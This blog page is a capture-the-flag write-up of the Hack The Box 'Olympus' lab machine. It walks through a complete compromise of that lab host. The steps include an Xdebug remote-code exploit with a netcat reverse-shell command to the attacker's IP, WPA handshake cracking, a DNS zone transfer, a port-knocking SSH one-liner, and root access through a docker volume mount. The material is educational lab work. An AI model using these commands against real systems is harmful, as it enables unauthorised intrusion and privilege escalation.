<!doctype html><html lang=en><head><meta name=viewport content="width=device-width,initial-scale=1"><meta charset=utf-8><meta content="utf-8" http-equiv=encoding><link rel=preload href=/fonts/FiraCode-VariableFont_wght.ttf as=font type=font/ttf crossorigin><link rel=stylesheet href=/css/bootstrap-grid.min.css type=text/css><link rel=stylesheet href=/css/main.css type=text/css><meta name=apple-mobile-web-app-title content="dubell.io | Hack The Box - Olympus Writeup"><meta name=apple-mobile-web-app-capable content="yes"><meta name=apple-mobile-web-app-status-bar-style content="black-translucent"><meta name=twitter:site content="@dubs3c"><meta name=twitter:creator content="@dubs3c"><meta property="og:title" content="dubell.io | Hack The Box - Olympus Writeup"><meta name=twitter:title content="dubell.io | Hack The Box - Olympus Writeup"><meta itemprop=name content="dubell.io | Hack The Box - Olympus Writeup"><meta name=application-name content="dubell.io | Hack The Box - Olympus Writeup"><meta property="og:site_name" content="dubell.io"><meta property="og:article:published_time" content="2019-08-15T00:00:00Z"><meta property="article:published_time" content="2019-08-15T00:00:00Z"><base href=https://dubell.io/htb-olympus-writeup/><link rel=canonical href=https://dubell.io/htb-olympus-writeup/ itemprop=url><meta name=url content="https://dubell.io/htb-olympus-writeup/"><meta name=twitter:url content="https://dubell.io/htb-olympus-writeup/"><meta property="og:url" content="https://dubell.io/htb-olympus-writeup/"><meta name=description content><meta itemprop=description content><meta property="og:description" content><meta name=twitter:description content><meta itemprop=image content="https://dubell.io/img/logo2.png"><meta property="og:image" content="https://dubell.io/img/logo2.png"><meta name=twitter:image content="https://dubell.io/img/logo2.png"><meta name=twitter:image:src content="https://dubell.io/img/logo2.png"><meta property="og:updated_time" content="2019-08-15T00:00:00Z"><link rel=sitemap type=application/xml title=Sitemap href=https://dubell.iositemap.xml><title>dubell.io | Hack The Box - Olympus Writeup</title></head><body><div class=container><div id=particles-js></div><div class=row><div class=col><header style=text-align:center><a href=/ class=noleet><img href=/ class=banner-image src=/img/logo2.png alt=logo></a></header></div></div><div class=row><div class=col style=text-align:center><nav><fieldset><legend>n4vig4ti0n</legend><ul><li><a href=/>/etc/motd</a></li><li><a href=/www/>/var/www</a></li><li><a href=/mnt/>/mnt</a></li><li><a href=/usr/>/usr</a></li></ul></fieldset></nav></div></div><div class=row><div class=content><article><div class=row><div class=col><h1>Hack The Box - Olympus Writeup</h1><p class=small style=color:#999><a href=/categories/ctf>CTF</a> / August 15, 2019 â€¢ 4 min read</p><p class=small><strong>Tags:</strong> <a href=/tags/htb class=tag>HTB</a></p></div></div><div class=row><div class=col><div id=article-content><p>I begun by scanning the box to find some interesting ports.</p><pre tabindex=0><code>PORT     STATE    SERVICE VERSION
22/tcp   filtered ssh
53/tcp   open     domain  (unknown banner: Bind)
80/tcp   open     http    Apache httpd
2222/tcp open     ssh     (protocol 2.0)
</code></pre><p>Port 80 was open so I visited the site and found a picture of the almighty God Zeus. I checked the response headers in the developer console and noticed the <code>xdebug</code> variable. According to my google fu, it&rsquo;s a PHP debugger which among other things, can be used to debug <a href=https://xdebug.org/docs/remote><em>remote</em></a> PHP applications.</p><p>I continued to recon the web for more info and found the following links:</p><p><a href=https://github.com/rapid7/metasploit-framework/pull/9916>https://github.com/rapid7/metasploit-framework/pull/9916</a></p><p><a href=https://github.com/rapid7/metasploit-framework/pull/9916>https://ricterz.me/posts/Xdebug%3A%20A%20Tiny%20Attack%20Surface</a></p><p>I used the script found in the last link. All you need to do is to setup a GET parameter and specify your attack IP in <code>X-FORWARDED-FOR</code>. I ran the <code>xdebug.py</code> script and sent the following HTTP request:</p><pre tabindex=0><code>GET /index.php?XDEBUG_SESSION_START=phpstorm HTTP/1.1
Host: 10.10.10.83
User-Agent: Mozilla/5.0 (X11; Windows x86_64; rv:59.0) Gecko/20100101 Firefox/59.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
X-FORWARDED-FOR: 10.10.14.7
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
</code></pre><p>The machine connected back to my attack machine! Next I setup a listener <code>nc -lvp 1337</code> and ran the following command from <code>xdebug.py</code>: <code>system("nc -e /bin/bash 10.10.10.14.7 1337")</code> which ran on the victim&rsquo;s box and created a reverse shell for me to use.</p><h3 id=whats-in-the-box>WHAT&rsquo;S IN THE BOX!?!?</h3><p>After gaining access I looked for <code>user.txt</code> but couldn&rsquo;t find it. After checking the home folder of <code>zeus</code>, checking the process list with <code>ps aux</code> and checking the root directory, I started to think this must be a docker container. I uploaded <code>linenum.sh</code> which later also reported to believe that the host was actually a docker container.</p><p>The user <code>zeus</code> had downloaded the project <code>airgeddon</code> from github which is a tool for attacking wireless networks. Inside the project I found a .pcap file and a .txt file with the following message:</p><pre tabindex=0><code>Captured while flying. I&#39;ll banish him to Olympia - Zeus
</code></pre><p>I opened the .pcap file and realised it was encrypted WLAN traffic, so I fired up <code>aircrack-ng</code> and got crackin! After 40 minutes using <code>rockyou.txt</code> as my wordlist, I found the password: <code>flightoficarus</code>. Inside the .pcap I could see clients connecting to an accesspoint called: <code>Too_cl0se_to_th3_Sun</code>.</p><p>I continued to scan the .pcap for more information but couldn&rsquo;t find anything. So I begun trying to SSH into the machine at port 2222 with different credentials, using greek mythology as my starting point. Everything I tried failed. One week later I try the same credentials again and voila, I had access. Why this didn&rsquo;t work the first time, I don&rsquo;t know. My guess is that people were hammering the machine hard so I timed out.</p><pre tabindex=0><code>icarus:Too_cl0se_to_th3_Sun
</code></pre><p>Turned out this was an other docker container, I deduced that from the hostname and process list. There was only one file available, which had the following contents:</p><pre tabindex=0><code>
Athena goddess will guide you through the dark...

Way to Rhodes...
ctfolympus.htb
</code></pre><p>Okey, so now I have a new domain, and port 53/tcp was open according to my port scan, that can only mean one thing&mldr;DNS ZONE TRANSFER!</p><p>First I ran the following:</p><pre tabindex=0><code>root@kali:~/Sites/htb-notes/olympus/http_serve# host -l ctfolympus.htb 10.10.10.83
Using domain server:
Name: 10.10.10.83
Address: 10.10.10.83#53
Aliases: 

ctfolympus.htb has address 192.168.0.120
ctfolympus.htb name server ns1.ctfolympus.htb.
ctfolympus.htb name server ns2.ctfolympus.htb.
mail.ctfolympus.htb has address 192.168.0.120
ns1.ctfolympus.htb has address 192.168.0.120
ns2.ctfolympus.htb has address 192.168.0.120
</code></pre><p>Okey nice, lets run the dns zone transfer!</p><pre tabindex=0><code>root@kali:~/Sites/htb-notes/olympus/http_serve# dig axfr @ctfolympus.htb ctfolympus.htb

; &lt;&lt;&gt;&gt; DiG 9.11.3-1-Debian &lt;&lt;&gt;&gt; axfr @ctfolympus.htb ctfolympus.htb
; (1 server found)
;; global options: +cmd
ctfolympus.htb.		86400	IN	SOA	ns1.ctfolympus.htb. ns2.ctfolympus.htb. 2018042301 21600 3600 604800 86400
ctfolympus.htb.		86400	IN	TXT	&#34;prometheus, open a temporal portal to Hades (3456 8234 62431) and St34l_th3_F1re!&#34;
ctfolympus.htb.		86400	IN	A	192.168.0.120
ctfolympus.htb.		86400	IN	NS	ns1.ctfolympus.htb.
ctfolympus.htb.		86400	IN	NS	ns2.ctfolympus.htb.
ctfolympus.htb.		86400	IN	MX	10 mail.ctfolympus.htb.
crete.ctfolympus.htb.	86400	IN	CNAME	ctfolympus.htb.
hades.ctfolympus.htb.	86400	IN	CNAME	ctfolympus.htb.
mail.ctfolympus.htb.	86400	IN	A	192.168.0.120
ns1.ctfolympus.htb.	86400	IN	A	192.168.0.120
ns2.ctfolympus.htb.	86400	IN	A	192.168.0.120
rhodes.ctfolympus.htb.	86400	IN	CNAME	ctfolympus.htb.
RhodesColossus.ctfolympus.htb. 86400 IN	TXT	&#34;Here lies the great Colossus of Rhodes&#34;
www.ctfolympus.htb.	86400	IN	CNAME	ctfolympus.htb.
ctfolympus.htb.		86400	IN	SOA	ns1.ctfolympus.htb. ns2.ctfolympus.htb. 2018042301 21600 3600 604800 86400
;; Query time: 46 msec
;; SERVER: 10.10.10.83#53(10.10.10.83)
;; WHEN: Mon May 14 19:27:19 CEST 2018
;; XFR size: 15 records (messages 1, bytes 475)
</code></pre><p>DNS zone transfer lets us get a copy of the zone file, so now we can see everything! The thing that stood out the most was:</p><pre tabindex=0><code>ctfolympus.htb.		86400	IN	TXT	&#34;prometheus, open a temporal portal to Hades (3456 8234 62431) and St34l_th3_F1re!&#34;
</code></pre><p>My thinking here was that the user <code>prometheus</code> needs to perform port knocking which will then open allow us to login via ssh on port 22, which was set to filtered according to my port scan.</p><p>Easy peasy one liner:</p><pre tabindex=0><code>for port in 3456 8234 62431; do nc ctfolympus.htb $port 2&gt; /dev/null; done; sshpass -p &#39;St34l_th3_F1re!&#39; ssh -o &#34;StrictHostKeyChecking no&#34; prometheus@ctfolympus.htb
</code></pre><p><code>sshpass</code> is a package which allows you to set the SSH password as an input parameter.</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span>Welcome to
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span>                            
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span>    )         (             
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span> ( /(     )   )<span style=color:#0086d2>\ </span>)   (      
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span> )<span style=color:#0086d2>\(</span>)) ( /(  (()/(  ))<span style=color:#0086d2>\ </span>(   
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span>((_)<span style=color:#0086d2>\ </span> )(_))  ((_))/((_))<span style=color:#0086d2>\ </span> 
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span>| |(_)((_)_   _| |(_)) ((_) 
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span>| &#39; <span style=color:#0086d2>\ </span>/ _<span style=color:#0086d2>`</span> |/ _<span style=color:#0086d2>`</span> |/ -_)(_-&lt; 
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span>|_||_|<span style=color:#0086d2>\_</span>_,_|<span style=color:#0086d2>\_</span>_,_|<span style=color:#0086d2>\_</span>__|/__/ 
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span>                           
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span>prometheus@olympus:~$
</span></span></code></pre></div><p>Aww yeee, we got access to the host machine and not some stupid container! Since I knew the host was running docker, I tried some commands to see what I could do, and to my surprise, I could do anything!</p><p>In order to get <code>root.txt</code>, all we need to do is to simply start a container and map root&rsquo;s home directory into the container. First I tried to use a ubuntu image but that didn&rsquo;t work, so I checked <code>docker images</code> and picked one from there.</p><pre tabindex=0><code>prometheus@olympus:~$ docker run --volume=/root:/volumes -i -t olympia /bin/bash
root@1c2a720c4fa5:/#
root@1c2a720c4fa5:/# ls /volumes/
root.txt
root@1c2a720c4fa5:/# cat /volumes/root.txt 
aba486990e2e849e25c23f6e41e5e303
root@1c2a720c4fa5:/#
</code></pre><p>And there you go.</p></div></div></div></article></div></div><footer></footer></div><script src=/js/particles.min.js defer></script><script src=/js/particles.conf.js defer></script><script src=/js/baffle.min.js async></script><script src=/js/main.js defer async></script></body></html>